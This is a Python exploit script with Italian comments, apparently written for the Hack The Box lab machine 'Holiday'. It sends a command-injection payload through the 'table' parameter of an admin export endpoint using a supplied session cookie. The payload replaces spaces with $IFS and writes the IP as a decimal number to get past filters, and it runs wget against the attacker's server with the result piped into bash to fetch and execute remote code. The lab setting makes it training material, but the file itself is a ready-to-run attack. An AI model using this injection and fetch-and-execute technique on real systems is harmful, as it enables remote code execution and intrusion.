import ipaddress
import argparse
import requests

parser = argparse.ArgumentParser(description="exploit admin macchina Holiday HTB")

parser.add_argument("-u", "--url", required=True, help="indirizzo della macchina (es. http://10.10.10.25)")
parser.add_argument("-p", "--port", default=80, help="porta del target")
parser.add_argument("-c", "--cookie", required=True, help="cookie obbligatorio")
parser.add_argument("-e", "--endpoint", default="admin/export", help="endpoint del target")
parser.add_argument("-t", "--parameter", default="table", help="parametro dell'endpoint")
parser.add_argument("-a", "--attacker", required=True, help="indirizzo ip dell'attaccante")
parser.add_argument("-s", "--server", default=80, help="porta del server dell'attaccante")

argomenti = parser.parse_args()

indirizzo = argomenti.url
porta = argomenti.port
cookie = argomenti.cookie
endpoint = argomenti.endpoint
parametro = argomenti.parameter
attaccante = argomenti.attacker
porta_server = argomenti.server

# Converte l'IP in decimale
ip_decimale = int(ipaddress.IPv4Address(attaccante))

cookies = {
    "connect.sid": cookie
}

# Costruiamo il payload senza spazi e senza punti per bypassare i filtri
# Il comando dice: esegui una wget al tuo IP decimale e passa l'output direttamente a bash
# Sostituiamo gli spazi con $IFS
# Payload pulito con i delimitatori
payload = f"any_string|wget$IFS{ip_decimale}:{porta_server}$IFS-O-$IFS|bash"

# Componiamo l'URL completo manualmente senza lasciare che requests faccia l'encoding automatico
target_url = f"{indirizzo}:{porta}/{endpoint}?{parametro}={payload}"

print(f"[+] Invio della richiesta HTTP a: {target_url}")

try:
    # Inviamo la GET con l'URL già formattato e inseriamo i cookie
    richiesta = requests.get(url=target_url, cookies=cookies)
    print(f"[+] Status Code ricevuto: {richiesta.status_code}")
    
    if richiesta.status_code == 200:
        print("[+] Richiesta accettata dal server!")
    elif richiesta.status_code == 404:
        print("[!] Ricevuto ancora 404. Verifica che l'indirizzo base non abbia slash doppi (es. http://holiday.htb)")
except Exception as e:
    print(f"[!] Errore: {e}")
